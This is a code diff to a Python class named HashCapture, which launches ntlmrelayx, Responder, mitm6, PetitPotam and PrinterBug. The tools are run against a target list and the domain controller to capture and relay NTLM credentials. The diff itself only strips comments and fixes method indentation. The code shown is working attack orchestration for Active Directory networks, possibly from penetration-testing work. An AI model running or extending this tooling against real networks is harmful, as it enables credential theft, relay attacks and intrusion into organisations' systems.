@@ -286,7 +286,6 @@ class HashCapture:
     def start_ntlmrelay(self):
         """Start NTLM relay attack"""
         try:
-            # Define the command and arguments for ntlmrelayx.py
             cmd = [
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
@@ -294,18 +293,15 @@ class HashCapture:
                 "-socks"
             ]
             
-            # Add domain-specific arguments if a domain is specified
             if self.domain:
                 cmd.extend([
                     "-domain", self.domain,
                     "-wh", self.local_ip
                 ])
             
-            # Start the ntlmrelayx.py process
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
             self.processes["ntlmrelay"] = process
             
-            # Log output and handle errors
             for line in iter(process.stdout.readline, b''):
                 line = line.decode('utf-8').strip()
                 if "Obtained valid SMB connection" in line:
@@ -323,25 +319,21 @@ class HashCapture:
     def start_responder(self):
         """Start Responder attack"""
         try:
-            # Define the command and arguments for Responder
             cmd = [
                 "responder",
                 "-I", self.interface,
                 "-wrf"
             ]
 
-            # Add domain-specific arguments if a domain is specified
             if self.domain:
                 cmd.extend([
                     "-v",
                     "-r", f"ldaps://{self.domain}"
                 ])
 
-            # Start the Responder process
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
             self.processes["responder"] = process
 
-            # Log output and handle errors
             for line in iter(process.stdout.readline, b''):
                 line = line.decode('utf-8').strip()
                 if "HTTPSS" in line or "RPCSS" in line:
@@ -367,7 +359,6 @@ class HashCapture:
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
             self.processes["mitm6"] = process
             
-            # Logging for mitm6
             for line in iter(process.stdout.readline, b''):
                 line = line.decode('utf-8').strip()
                 self.attack_loggers["mitm6"].debug(line)
@@ -377,14 +368,13 @@ class HashCapture:
             self.logger.error(f"Error in start_mitm6: {e}")
             return False
 
-def start_petitpotam(self):
+    def start_petitpotam(self):
         """Start PetitPotam attack"""
         try:
             if not self.domain or not self.get_dc_ip():
                 self.logger.warning("PetitPotam attack requires a valid domain")
                 return False
 
-            # Part 2 to fix indents 
             cmd = [
                 "petitpotam.py",
                 "-t", self.get_dc_ip(),
@@ -406,7 +396,7 @@ def start_petitpotam(self):
             self.logger.error(f"Error in start_petitpotam: {e}")
             return False
 
-def start_printerbug(self):
+    def start_printerbug(self):
         """Start PrinterBug attack"""
         try:
             if not self.domain or not self.get_dc_ip():
